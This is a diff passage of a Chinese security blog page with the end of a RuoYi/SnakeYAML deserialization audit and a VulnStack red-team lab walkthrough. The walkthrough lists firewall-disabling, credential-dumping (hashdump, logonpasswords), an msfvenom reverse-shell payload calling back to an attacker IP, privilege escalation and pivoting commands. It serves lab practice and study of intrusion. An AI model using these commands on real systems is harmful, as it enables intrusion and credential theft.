&#125;</span><br><span class="line">   else //如果不是，是全类名的话，利用Class反射加载类，有两个条件：1)类有无参构造器、2)public</span><br><span class="line">   &#123;</span><br><span class="line">       Object bean = Class.forName(beanName).newInstance();</span><br><span class="line">       invokeMethod(bean, methodName, methodParams);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   //snakeyaml漏洞成因分析，通过反射生成构造器，通过递归的方式生成成员属性，最后进行实例化return c.newInstance(argumentListx);</span><br><span class="line">   org.yaml.snakeyaml.Yaml#load(java.lang.String)--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.Yaml#loadFromReader--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.constructor.BaseConstructor#getSingleData--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.constructor.BaseConstructor#constructDocument--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.constructor.BaseConstructor#constructObject--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.constructor.BaseConstructor#constructObjectNoCheck--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.constructor.Construct#construct--&gt;;</span><br><span class="line">   org.yaml.snakeyaml.constructor.Construct#construct--&gt;;</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
- <img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230301100133494.png" alt="image-20230301100133494"></li>
-</ul>
-<ol start="3">
-<li><p>反序列化完之后，没有出现预期的效果，说明是在<code>javax.script.ScriptEngineManager</code>的<code>newInstance</code>进行构造的过程中触发的RCE。</p>
-<ol>
-<li><p>SPI机制</p>
-<p>全称为 Service Provider Interface，是一种服务发现机制。它通过在ClassPath路径下的META-INF&#x2F;services文件夹查找文件，<strong>自动加载文件里所定义的类</strong>。</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230301103921522.png" alt="image-20230301103921522" style="zoom:80%;">
-</li>
-<li><p>服务查找，匹配，并实例化</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230301104219344.png" alt="image-20230301104219344">
-
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230301104643998.png" alt="image-20230301104643998">
-
-<ol start="3">
-<li><p>snakeyaml和ScriptEngineManager的漏洞链</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230301105053508.png" alt="image-20230301105053508" style="zoom:80%;"></li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ruoyi框架Quartz层面调用的invokeMethod调用目标字符串通过反射进行实例化</span><br><span class="line">2. snakeyaml反射生成实例结合ScriptEngineManager，这里主要是因为可控的因素有：</span><br><span class="line">   	 1&gt;snakeyaml的load方法参数，并且没有判断是否有使用rmi、http、ldap之类的字样，</span><br><span class="line">   	 2&gt;ScriptEngineManager的服务加载类名，</span><br><span class="line">  	 3&gt;目标服务出网获取需要加载的恶意类</span><br></pre></td></tr></table></figure>
-
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/02/12/VulnStack/">VulnStack</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-02-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></span><div class="content"><h1 id="vulstack红队评估（1）"><a href="#vulstack红队评估（1）" class="headerlink" title="vulstack红队评估（1）"></a>vulstack红队评估（1）</h1><img src="/2023/02/12/VulnStack/2022-12-29 13-15-15屏幕截图.png" style="zoom:80%;">
-
-<h2 id="虚拟机配置："><a href="#虚拟机配置：" class="headerlink" title="虚拟机配置："></a>虚拟机配置：</h2><p>win7：网卡1为外网可访问（192.168.227.128），网卡2为域环境</p>
-<p>win2003：网卡1为域环境</p>
-<p>win2008：DC，网卡1为域环境</p>
-<p>kali：攻击机（192.168.227.129）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">本机名，确定是否有域，DC，网段有多少主机存在</span><br><span class="line">系统版本systeminfo，补丁信息，是否有杀软</span><br><span class="line">确定DC的ip</span><br><span class="line">主机密码搜集mimikatz</span><br><span class="line">通过nmap --script=vuln &lt;ip&gt;扫描ms系列漏洞</span><br><span class="line">445端口对应smb服务是否开启</span><br><span class="line">3389是否开启</span><br><span class="line">是否多层代理</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口信息"><a href="#端口信息" class="headerlink" title="端口信息"></a>端口信息</h3><ul>
-<li><code>nmap -T4 -sV 192.168.227.128</code></li>
-</ul>
-<img src="/2023/02/12/VulnStack/image-20230210190726306.png" alt="image-20230210190726306" style="zoom: 80%;">
-
-<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><img src="/2023/02/12/VulnStack/image-20230210190943319.png" alt="image-20230210190943319" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230210191838100.png" alt="image-20230210191838100" style="zoom:80%;">
-
-<h3 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h3><p>没有域名，没必要扫了</p>
-<h2 id="Web探针"><a href="#Web探针" class="headerlink" title="Web探针"></a>Web探针</h2><img src="/2023/02/12/VulnStack/image-20230210193051015.png" alt="image-20230210193051015" style="zoom:80%;">
-
-
-
-<p>总的来说：</p>
-<ul>
-<li>有web站点，mysql，开通了135、445说明内网可能可以hash传递。</li>
-<li>phpmyadmin以及备份文件</li>
-<li>web绝对路径：C:&#x2F;phpStudy&#x2F;WWW</li>
-</ul>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="mysql配置泄露"><a href="#mysql配置泄露" class="headerlink" title="mysql配置泄露"></a>mysql配置泄露</h3><p>虽然有账号密码，但root用户不允许远程登录</p>
-<img src="/2023/02/12/VulnStack/image-20230210192346824.png" alt="image-20230210192346824" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230210192445068.png" alt="image-20230210192445068" style="zoom:80%;">
-
-
-
-<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="CobaltStike方式"><a href="#CobaltStike方式" class="headerlink" title="CobaltStike方式"></a>CobaltStike方式</h3><ol>
-<li><p>通过webshell，查询是否有杀软，并关闭防火墙</p>
-<ol>
-<li><code>tasklist /svc</code> 列举进程服务信息</li>
-</ol>
-<img src="/2023/02/12/VulnStack/image-20230212111911803.png" alt="image-20230212111911803" style="zoom:80%;">
-
-<ol start="2">
-<li><code>netsh advfirewall set allprofiles state off</code>  #关闭防火墙</li>
-</ol>
-<img src="/2023/02/12/VulnStack/image-20230212112045097.png" alt="image-20230212112045097" style="zoom:80%;">
-</li>
-<li><p>生成木马，通过冰蝎上传木马，执行木马，CobaltStike成功上线</p>
-<ol>
-<li><p>生成木马</p>
-<img src="/2023/02/12/VulnStack/image-20230212111614035.png" alt="image-20230212111614035" style="zoom:80%;">
-</li>
-<li><p>执行木马</p>
-<img src="/2023/02/12/VulnStack/image-20230212112314954.png" alt="image-20230212112314954" style="zoom:80%;">
-</li>
-<li><p>cs查看机器上线</p>
-<img src="/2023/02/12/VulnStack/image-20230212112343236.png" alt="image-20230212112343236" style="zoom:80%;"></li>
-</ol>
-</li>
-</ol>
-<h4 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h4><ol>
-<li>基本信息搜集</li>
-</ol>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 网络信息&amp;主机信息&amp;（存在域）域信息</span></span><br><span class="line">shell ipconfig /all <span class="comment"># 判断是否有域 如果有，一般dns就是DC</span></span><br><span class="line">shell whoami</span><br><span class="line">shell hostname</span><br><span class="line">net view</span><br><span class="line">shell net time /domain</span><br><span class="line">shell nslookup domain<span class="literal">-name</span></span><br><span class="line">shell net localgroup administrators</span><br><span class="line">shell net user /domain</span><br><span class="line">shell net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/02/12/VulnStack/image-20230212114511437.png" alt="image-20230212114511437" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212114954004.png" alt="image-20230212114954004" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212115041854.png" alt="image-20230212115041854">
-
-<img src="/2023/02/12/VulnStack/image-20230212115127552.png" alt="image-20230212115127552" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212115344012.png" alt="image-20230212115344012" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212114358248.png" alt="image-20230212114358248" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212115526684.png" alt="image-20230212115526684" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212115551903.png" alt="image-20230212115551903" style="zoom:80%;">
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本机名：STU1</span><br><span class="line">本地组的管理员权限：Administrator，liukaifeng01 （已获得管理员权限）</span><br><span class="line">域管理员权限：Domain Admins</span><br><span class="line">域控：192.168.52.138 OWA</span><br><span class="line">域内ip：192.168.52.138（DC） 192.168.52.141（域成员） 192.168.52.143（本机）</span><br><span class="line">域内用户：administrators，krbtgt，ligang，liukaifeng01</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#系统信息搜集</span></span><br><span class="line">shell systeminfo <span class="comment"># 查看补丁 系统架构</span></span><br><span class="line">shell systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span>  <span class="comment"># 英文操作系统</span></span><br><span class="line">shell systeminfo | findstr /B /C:<span class="string">&quot;OS 名称&quot;</span> /C:<span class="string">&quot;OS 版本&quot;</span>   <span class="comment"># 中文操作系统</span></span><br><span class="line">shell <span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%    <span class="comment"># 查看系统系统结构</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2023/02/12/VulnStack/image-20230212120139739.png" alt="image-20230212120139739" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212120247097.png" alt="image-20230212120247097" style="zoom:80%;">
-
-<ol start="2">
-<li>凭据信息搜集</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/02/12/VulnStack/image-20230212121942634.png" alt="image-20230212121942634" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212122034167.png" alt="image-20230212122034167" style="zoom:80%;">
-
-<h5 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig /all</span><br><span class="line">shell net config Workstation</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/02/12/VulnStack/image-20230212172613204.png" alt="image-20230212172613204" style="zoom:80%;">
-
-<h5 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line">logonpasswords</span><br></pre></td></tr></table></figure>
-
-<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><ul>
-<li><p><code>nmap --script=vuln &lt;ip&gt;</code></p>
-<img src="/2023/02/12/VulnStack/image-20230212184204892.png" alt="image-20230212184204892" style="zoom:80%;">
-
-<p>存在ms08-067和ms17-010漏洞。</p>
-</li>
-</ul>
-<h3 id="msf方式"><a href="#msf方式" class="headerlink" title="msf方式"></a>msf方式</h3><ul>
-<li><p>生成tcp反向木马，上传</p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.227.129 LPORT=4444 -f exe &gt; shell.exe</code></p>
-</li>
-<li><p>msf开启监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 192.168.227.129</span><br><span class="line">set payload windows/meterpreter/reverse_tcp #tcp类型</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>提权（<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252594.html%EF%BC%89">https://www.freebuf.com/articles/web/252594.html）</a></p>
-<ol>
-<li>直接利用getsystem提权(因为没有uac限制)</li>
-</ol>
-<img src="/2023/02/12/VulnStack/image-20230212165337184.png" alt="image-20230212165337184" style="zoom:80%;">
-
-<ol start="2">
-<li>保存会话后，可以使用msf模块绕过UAC进行提权</li>
-</ol>
-<img src="/2023/02/12/VulnStack/image-20230212170714465.png" alt="image-20230212170714465" style="zoom:80%;">
-
-<ol start="3">
-<li>使用ms系列未修补漏洞提权，如ms16-032、ms17-010等</li>
-</ol>
-</li>
-</ul>
-<p>shell进入命令行，信息收集就和CS域内信息收集差不多了。</p>
-<h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><ul>
-<li>获取网卡信息，获取路由信息</li>
-</ul>
-<img src="/2023/02/12/VulnStack/image-20230212170041101.png" alt="image-20230212170041101" style="zoom:80%;">
-
-<img src="/2023/02/12/VulnStack/image-20230212170113377.png" style="zoom:80%;">
-
-<ul>
-<li><p>在多层网络的情况下，需要添加路由 <code>run autoroute 192.168.52.0/24</code></p>
-</li>
-<li><p>探测域内存活主机 <code>run windows/gather/enum_ad_computers</code>，探测域内所有存活主机<code>use auxiliary/scanner/netbios/nbname</code>：</p>
-<img src="/2023/02/12/VulnStack/image-20230212180312605.png" alt="image-20230212180312605" style="zoom:80%;">
-</li>
-<li><p>域控列表：<code>run windows/gather/enum_domains</code></p>
-<img src="/2023/02/12/VulnStack/image-20230212180415536.png" alt="image-20230212180415536" style="zoom:80%;">
-</li>
-<li><p>扫描smb模块，扫描ms17-010模块（445端口）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看补丁：<code>run post/windows/gather/enum_patchs</code></p>
-</li>
-<li><p>安装软件信息：<code>run post/windows/gather/enum_applications</code></p>
-</li>
-<li><p>arp扫描网段：<code>run post/windows/gather/arp_scanner rhosts=host/24</code></p>
-</li>
-<li><p>关闭防火墙，使用nmap扫描：<code>netsh advfirewall set allprofiles state off</code>，<code>nmap -sS -sV -O 192.168.52.141</code></p>
-</li>
-<li><p>nmap漏洞扫描：<code>nmap --script=vuln 192.168.52.141</code></p>
-</li>
-</ul>
-<h4 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h4><ul>
-<li><p>使用msf开启3389端口</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br><span class="line">netstat -an #查看是否开启成功</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/02/12/VulnStack/image-20230212173315595.png" alt="image-20230212173315595" style="zoom:80%;">
-</li>
-<li><p><code>mstsc</code>远程连接：</p>
-</li>
-</ul>
-<img src="/2023/02/12/VulnStack/image-20230212173420076.png" alt="image-20230212173420076" style="zoom: 50%;">
-
-
-
-<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><a target="_blank" rel="noopener" href="https://v0w.top/2020/07/19/vulnstack1/#4-4-%E6%A8%AA%E5%90%91%E6%8E%A2%E6%B5%8B">https://v0w.top/2020/07/19/vulnstack1/#4-4-%E6%A8%AA%E5%90%91%E6%8E%A2%E6%B5%8B</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252594.html">https://www.freebuf.com/articles/web/252594.html</a></p>
-</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By Aizlm</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By Aizlm</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
   $('#top-container').addClass('is-mobile')
